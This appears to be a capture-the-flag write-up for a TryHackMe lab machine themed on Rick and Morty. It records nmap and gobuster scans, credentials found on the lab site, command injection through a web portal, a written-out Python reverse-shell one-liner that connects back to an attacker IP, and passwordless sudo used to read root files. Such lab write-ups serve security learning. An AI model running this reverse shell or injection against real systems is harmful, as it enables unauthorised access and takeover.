@@ -1,0 +1,103 @@
+# NMAP results
+kali@kali:~/Downloads/TryHackMe/uploadVulnerability$ nmap -T4 -A -O 10.10.78.246
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 02:26 IST
+Nmap scan report for rick.thm (10.10.78.246)
+Host is up (0.22s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9f:ab:0c:43:68:ae:10:22:b0:be:d4:e0:4c:d9:66:17 (RSA)
+|   256 f8:58:bc:77:f9:5b:f3:98:88:0b:93:54:09:a3:c0:e6 (ECDSA)
+|_  256 12:57:28:3d:d7:ad:a0:f1:2f:d2:eb:c4:91:d9:44:90 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Rick is sup4r cool
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=4/17%OT=22%CT=1%CU=44297%PV=Y%DS=2%DC=T%G=Y%TM=680019B
+OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=3%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
+OS:(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%
+OS:CI=Z%II=I%TS=A)SEQ(SP=FA%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD
+OS:=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E2ST11NW7%O2=M4E2ST11NW7%O3=M4E2
+OS:NNT11NW7%O4=M4E2ST11NW7%O5=M4E2ST11NW7%O6=M4E2ST11)WIN(W1=F4B3%W2=F4B3%W
+OS:3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E2NNSNW7%CC=
+OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
+OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
+OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z
+OS:%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
+OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 110/tcp)
+HOP RTT       ADDRESS
+1   240.49 ms 10.21.0.1
+2   240.59 ms rick.thm (10.10.78.246)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 38.43 seconds
+
+
+# web inspect
+username : R1ckRul3s
+
+# robots.txt
+Wubbalubbadubdub
+
+# gobuster directory bruteforce:
+kali@kali:~/Downloads$ gobuster dir -u http://rick.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,xml,js,txt,css,html,cgi,python 
+
+* * *
+/.php                 (Status: 403) [Size: 273]
+/.html                (Status: 403) [Size: 273]
+/index.html           (Status: 200) [Size: 1062]
+/login.php            (Status: 200) [Size: 882]
+/assets               (Status: 301) [Size: 305] [--> http://rick.thm/assets/]
+/portal.php           (Status: 302) [Size: 0] [--> /login.php]
+
+* * *
+
+
+# Portal.php inspect find
+<!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
+  this is just a rabit hole:
+
+# 3 QUESTIONS
+1: FIRST INGRIDIENT
+: go to /login.php
+enter the credentials we found 
+ls on the .portal.php :(command line)
+we will find a new page : there we will find the first ingridient
+* * *
+mr. meeseek hair
+* * *
+
+2: 2nd INGRIDIENT
+go to /clue.txt  :--> Look around the file system for the other ingredient.
+ls /home/rick ::--> second ingridients
+"  FOR THE SPACE IN THE FILE , WE WILL KEEP IT IN THE  : " " : "
+as the cat command is not working, we will go with the alternative of cat:
+less /home/rick/"second ingridients"
+* * *
+1 jerry tear
+* * *
+3: 3rd INGRIDIENT
+ use reverse shell  and netcat for gaining access:
+
+python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
+s.connect(("10.21.129.108",4444)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);'
+
+after getting the shell
+sudo -l
+we will see that there is no need for password for anything, se we can become the root user without doing any complicated things
+
+sudo ls /root :->
+sudo cat /root/3rd.txt
+3rd ingredients:
+* * *
+fleeb juice
+* * *
